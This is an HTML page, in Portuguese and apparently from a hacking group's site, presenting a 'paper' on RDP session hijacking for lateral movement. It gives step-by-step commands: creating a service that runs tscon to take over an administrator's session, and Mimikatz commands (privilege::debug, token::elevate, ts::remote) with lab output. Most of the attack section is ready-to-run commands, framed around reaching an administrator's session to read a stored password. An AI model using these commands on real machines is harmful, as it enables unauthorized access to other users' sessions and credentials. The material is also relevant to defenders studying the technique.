@@ -1,0 +1,326 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=1024">
+    <link rel="icon" type="image/x-icon" href="../../../favicon.ico">
+    <title>Paper: Movimentação Lateral Através do Sequestro de RDP - Amolo</title>
+
+    <style>
+    @font-face {
+        font-family: 'EnglishTowne';
+        src: url('../../../fonts/EnglishTowne.ttf') format('truetype');
+    }
+
+    body {
+        background-image: url('../../../imgs/bg.png');
+        background-size: cover;
+        background-repeat: no-repeat;
+        background-position: center;
+        background-attachment: fixed;
+        margin: 0;
+        padding: 0;
+    }
+
+    .ascii {
+        color: white;
+        padding: 30px;
+        text-align: center;
+        font-family: 'EnglishTowne', cursive;
+        font-size: 90px;
+    }
+
+    .nav {
+        display: flex;
+        justify-content: center;
+        background-color: rgba(5, 5, 5, 0.8);
+        gap: 10px;
+        padding: 10px 0;
+    }
+
+    .nav a {
+        color: white;
+        text-align: center;
+        padding: 14px 16px;
+        text-decoration: none;
+        font-family: monospace;
+    }
+
+    .nav a:hover {
+        background-color: rgb(38, 7, 112);
+        color: white;
+        border-radius: 5px;
+    }
+
+    .nav a.active {
+        background-color: rgb(71, 37, 153);
+        color: white;
+        border-radius: 5px;
+    }
+
+    .card {
+        color: #000;
+        background-color: #aaa;
+        padding: 20px;
+        margin-top: 20px;
+    }
+
+    .pre-container {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+    }
+
+    pre {
+		background-color: #1e1e1e40;
+		color: white;
+		padding: 20px 30px;
+		border-radius: 10px;
+		box-shadow: 0 4px 8px rgba(0,0,0,0.5);
+		width: 90%;
+		max-width: 1200px;
+		margin: 0 auto;
+		overflow-x: auto;
+		white-space: pre-wrap;
+		font-family: monospace;
+
+		border: 2px solid rgba(255, 255, 255, 0.75);
+		box-sizing: border-box;
+
+		text-indent: 0;
+		word-break: break-word;
+	}
+    </style>
+</head>
+
+<body>
+    <div class="nav">
+        <a href="../../index.html">❮─❲Home❳─❯</a>
+        <a href="../../papers/" class="active">❮─❲✧Papers✧❳─❯</a>
+        <a href="../../members/">❮─❲Membros❳─❯</a>
+    </div>
+
+    <div class="ascii">
+        Amolo ☽
+    </div>
+
+    <h1 style="line-height: normal; margin:unset; padding:unset; font-family:monospace; text-align:center; color:white;">
+        APT-38: Movimentação Lateral Através do Sequestro de RDP
+    </h1>
+    <p style="line-height: normal; margin:unset; padding:unset; margin-bottom: 20px; font-family:monospace; text-align:center; color:white;">
+		Autor: @br0sck
+	</p>
+
+    <div class="pre-container">
+        <pre>
+⠀⠀⠀⣤⣴⣾⣿⣿⣿⣿⣿⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡄
+⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⢰⣦⣄⣀⣀⣠⣴⣾⣿⠃
+⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⠀
+⠀⠀⣼⣿⡿⠿⠛⠻⠿⣿⣿⡇⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀
+⠀⠀⠉⠀⠀⠀⢀⠀⠀⠀⠈⠁⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀
+⠀⠀⣠⣴⣶⣿⣿⣿⣷⣶⣤⠀⠀⠀⠈⠉⠛⠛⠛⠉⠉⠀⠀⠀
+⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⣶⣦⣄⣀⣀⣀⣤⣤⣶⠀⠀
+⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀
+⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀
+⢠⣿⡿⠿⠛⠉⠉⠉⠛⠿⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀
+⠘⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⢿⣿⣿⣿⣿⣿⠿⠛⠀⠀⠀
+
+
+
+	▓▓▓▓▓▓        ▓▓▓▓▓▓      ▓▓▓▓▓▓▓▓    ▓▓▓▓▓▓▓▓▓▓▓▓▓▓    ▓▓▓▓    
+  ▓▓▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓▓▓▓▓▓▓▓▓▒▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▒▒▓▓  
+  ▓▓▒▒  ▒▒▒▒▒▒▒▒▒▒▒▒  ▒▒▒▒▒▒▒▒▒▒    ▒▒▒▒▒▒▒▒          ▒▒▒▒▒▒▒▒▒▒▓▓  
+  ▓▓▒▒                           Sumário                      ▒▒▓▓  
+  ▓▓▒▒                                                        ▒▒▓▓  
+    ▓▓▒▒             1. O que é um Sequestro de RDP           ▒▒▓▓▓▓
+    ▓▓▒▒                                                      ▒▒▓▓▓▓
+    ▓▓▒▒                                                      ▒▒▓▓  
+  ▓▓▓▓▒▒                                                      ▒▒▓▓  
+  ▓▓▒▒                       2. Requisitos                    ▒▒▓▓▓▓
+  ▓▓▒▒                                                          ▒▒▓▓
+  ▓▓▓▓▒▒                                                        ▒▒▓▓
+    ▓▓▒▒                                                        ▒▒▓▓
+    ▓▓▒▒      3. Sequestro Utilizando o Prompt de Comandos    ▒▒▓▓▓▓
+    ▓▓▒▒                                                      ▒▒▓▓  
+    ▓▓▓▓▒▒                                                    ▒▒▓▓  
+    ▓▓▒▒                                                      ▒▒▓▓  
+    ▓▓▓▓▒▒          4. Sequestro Utilizando o Mimikatz        ▒▒▓▓▓▓
+    ▓▓▒▒                                                        ▒▒▓▓
+    ▓▓▒▒                                                        ▒▒▓▓
+    ▓▓▒▒               ████████       ████                      ▒▒▓▓
+    ▓▓▒▒            ██████             █████████                ▒▒▓▓
+    ▓▓▒▒                                                      ▒▒▓▓▓▓
+    ▓▓▒▒              ████████              ██    ██████      ▒▒▒▒  
+    ▓▓▒▒        ████████    ██████████      ████████  ████    ▒▒▒▒  
+  ▓▓▓▓▒▒                      ████                            ▒▒▒▒  
+  ▓▓▒▒                                                        ▒▒▓▓  
+  ▓▓▓▓▒▒        ██        ██                          ████    ▒▒▓▓▓▓
+    ▓▓▒▒        ██████  ████████  ████    ████████████  ██      ▒▒▓▓
+    ▓▓▒▒            ██████    ██████                            ▒▒▓▓
+  ▓▓▓▓▒▒                                                        ▒▒▓▓
+  ▓▓▓▓▒▒▒▒▒▒  ▒▒▒▒▒▒▒▒▒▒    ▒▒▒▒▒▒    ▒▒▒▒▒▒▒▒  ▒▒▒▒▒▒▒▒▒▒▒▒▒▒  ▒▒▓▓
+    ▓▓▓▓▓▓▓▓▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▓▓▓▓▓▓▒▒▒▒▓▓▓▓▓▓▓▓▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓  
+        ▓▓▓▓▓▓        ▓▓▓▓▓▓    ▓▓▓▓▓▓      ▓▓▓▓      ▓▓▓▓▓▓▓▓▓▓  
+
+
+Neste paper, eu irei abordar 2 formas para executar um sequestro de (Remote Desktop Protocol).
+
+╔════════════════════════════════════╗
+║     O que é um Sequestro de RDP    ║
+╚════════════════════════════════════╝
+
+O sequestro de RDP é uma das técnicas essenciais relacionada a pós-exploração em ambientes Windows. Com essa técnica, é possível obter acesso remoto à área de trabalho de um usuário para ter acesso a dados que estão presente na sessão do usuário.
+
+O cenário de exemplo que iremos utilizar terá uma sessão RDP do usuário	Administrator ativa, onde há uma senha escrita em um bloco de notas. O objetivo é sequestrar a sessão do usuário Administrator para conseguir ter acesso ao bloco de notas onde está a senha.
+
+╔═══════════════════╗
+║     Requisitos    ║
+╚═══════════════════╝
+
+Para que o ataque funcione corretamente, é necessário ter todos esses requisitos:
+* Conta de usuário com acesso administrativo
+* Acesso à máquina via RDP
+* Mimikatz implantado na máquina
+
+╔═════════════════════════════════════════════════╗
+║     Sequestro Utilizando o Prompt de Comando    ║
+╚═════════════════════════════════════════════════╝
+
+O sequestro de sessão RDP utilizando o Prompt de Comando se resume em criar um serviço onde irá executar o cmd.exe chamando o executável "tscon.exe" para pular para outra sessão. Se tentar executar o tscon sem ser por uma conta de serviço, o programa retorna uma mensagem pedindo para o usuário colocar a senha da conta que quer sequestrar.
+
+Um prompt de comando ou powershell executado como administrador não é o suficiente, é necessário executar o ataque com uma conta com permissão acima do grupo de administradores. A conta "Local Service" está acima dos administradores, se executar o tscon com esse usuário, não será necessário se autenticar na conta do usuário alvo.
+
+Vamos começar!
+Execute o cmd.exe como administrador e execute o seguinte comando:
+
+╔════════════════════════════════════════════════════════════════════════════════════╗
+║Microsoft Windows [Version 10.0.20348.587]                                          ║
+║(c) Microsoft Corporation. All rights reserved.                                     ║
+║                                                                                    ║
+║C:\Windows\system32>query user                                                      ║
+║ USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME         ║
+║ administrator         rdp-tcp#0           2  Active          .  06/05/2023 10:18   ║
+║>rdpuser               rdp-tcp#1           3  Active          .  06/05/2023 10:18   ║
+╚════════════════════════════════════════════════════════════════════════════════════╝
+
+Com esse comando, é possível ver todas as sessões RDP's ativas na máquina. O usuário utilizado é o "rdpuser", que será responsável pelo sequestro da sessão RDP do usuário "administrator".
+
+Tendo isso em mente, crie um serviço pelo cmd com o seguinte comando:
+
+sc create rdphijacking binpath="cmd.exe /k tscon ID /dest:SESSIONNAME"
+
+Altere o "ID" para o ID da sessão que você quer sequestrar, que neste caso, é o ID 2. Também altere o "SESSIONNAME" para o seu nome de sessão do RDP, que neste caso, é rdp-tcp#1.
+
+╔════════════════════════════════════════════════════════════════════════════════════╗
+║Microsoft Windows [Version 10.0.20348.587]                                          ║
+║(c) Microsoft Corporation. All rights reserved.                                     ║
+║                                                                                    ║
+║C:\Windows\system32>query user                                                      ║
+║ USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME         ║
+║ administrator         rdp-tcp#0           2  Active          .  06/05/2023 10:18   ║
+║>rdpuser               rdp-tcp#1           3  Active          .  06/05/2023 10:18   ║
+║                                                                                    ║
+║C:\Windows\system32>sc create testsvc binpath="cmd.exe /k tscon 2 /dest:rdp-tcp#1"  ║
+║[SC] CreateService SUCCESS                                                          ║ 
+║                                                                                    ║
+╚════════════════════════════════════════════════════════════════════════════════════╝
+
+O serviço foi criado, agora basta executar o comando "net start testsvc".
+
+Após a execução, sua sessão será trocada rapidamente para a sessão RDP que você sequestrou. Caso queira deletar o serviço, execute o comando "sc delete testsvc".
+
+╔════════════════════════════════════════╗
+║     Sequestro Utilizando o Mimikatz    ║
+╚════════════════════════════════════════╝
+
+A ferramenta Mimikatz contém funcionalidades relacionadas a RDP que ajudam na movimentação lateral. Instale o Mimikatz na máquina alvo e execute os seguintes comandos no cmd como administrador:
+
+╔═════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
+║C:\Users\rdpuser\Desktop\mimikatz-master\x64>mimikatz.exe                                                                                    ║
+║                                                                                                                                             ║
+║  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36                                                                                 ║
+║ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)                                                                                                  ║
+║ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )                                                                     ║
+║ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz                                                                                       ║
+║ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )                                                                    ║
+║  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/                                                                    ║
+║                                                                                                                                             ║
+║mimikatz # privilege::debug                                                                                                                  ║
+║Privilege '20' OK                                                                                                                            ║
+║                                                                                                                                             ║
+║mimikatz # token::elevate                                                                                                                    ║
+║Token Id  : 0                                                                                                                                ║
+║User name :                                                                                                                                  ║
+║SID name  : NT AUTHORITY\SYSTEM                                                                                                              ║
+║                                                                                                                                             ║
+║560     {0;000003e7} 1 D 20777          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary                                      ║
+║-> Impersonated !                                                                                                                            ║
+║* Process Token : {0;00083144} 3 F 2696845     ADLAB\rdpuser   S-1-5-21-1925757665-3945186109-1063137025-1104  (14g,26p)       Primary       ║
+║* Thread Token  : {0;000003e7} 1 D 2773832     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)            ║
+║                                                                                                                                             ║
+║mimikatz # ts::sessions                                                                                                                      ║
+║                                                                                                                                             ║
+║Session: 0 - Services                                                                                                                        ║
+║state: Disconnected (4)                                                                                                                      ║
+║user :  @                                                                                                                                    ║
+║curr : 06/05/2023 11:00:24                                                                                                                   ║
+║lock : no                                                                                                                                    ║
+║                                                                                                                                             ║
+║Session: 1 - Console                                                                                                                         ║
+║state: Connected (1)                                                                                                                         ║
+║user :  @                                                                                                                                    ║
+║Conn : 06/05/2023 10:17:21                                                                                                                   ║
+║curr : 06/05/2023 11:00:24                                                                                                                   ║
+║lock : no                                                                                                                                    ║
+║                                                                                                                                             ║
+║Session: 2 - RDP-Tcp#0                                                                                                                       ║
+║state: Active (0)                                                                                                                            ║
+║user : Administrator @ ADLAB                                                                                                                 ║
+║Conn : 06/05/2023 10:18:39                                                                                                                   ║
+║logon: 06/05/2023 10:18:40                                                                                                                   ║
+║last : 06/05/2023 10:59:05                                                                                                                   ║
+║curr : 06/05/2023 11:00:24                                                                                                                   ║
+║lock : no                                                                                                                                    ║
+║addr4: 10.18.1.10                                                                                                                            ║
+║                                                                                                                                             ║
+║Session: *3 - RDP-Tcp#1                                                                                                                      ║
+║state: Active (0)                                                                                                                            ║
+║user : rdpuser @ ADLAB                                                                                                                       ║
+║Conn : 06/05/2023 10:18:53                                                                                                                   ║
+║logon: 06/05/2023 10:18:55                                                                                                                   ║
+║last : 06/05/2023 11:00:24                                                                                                                   ║
+║curr : 06/05/2023 11:00:24                                                                                                                   ║
+║lock : no                                                                                                                                    ║
+║addr4: 10.18.1.12                                                                                                                            ║
+║                                                                                                                                             ║
+║Session: 65536 - RDP-Tcp                                                                                                                     ║
+║state: Listen (6)                                                                                                                            ║
+║user :  @                                                                                                                                    ║
+║lock : no                                                                                                                                    ║
+║                                                                                                                                             ║
+║mimikatz # ts::remote /id:2                                                                                                                  ║
+╚═════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
+
+Observe que o parâmetro "id" está com o número 2, que é o ID da sessão do usuário Administrator.
+
+Ao executar os comandos, você será redirecionado para a sessão do usuário.
+
+
+                        _--_
+                       /   -)
+                   ___/___|___
+      ____-----=~~///|     ||||~~~==-----_____
+    //~////////////~/|     |//|||||\\\\\\\\\\\\\
+   ///////////////////|   |///////|\\\\\\\\\\\\\\\
+ /////~~~~~~~~~~~~~~~\ |.||/~~~~~~~~~~~~~~~~~`\\\\\
+//~                  /\\|\\                      ~\\
+                    ///W^\W\
+                   ////|||\\\
+                   ~~~~~~~~~~
+
+Obrigado por lerem meu paper, até a próxima ;)
+                </pre>                    
+        </div>
+    </body>
+</html>
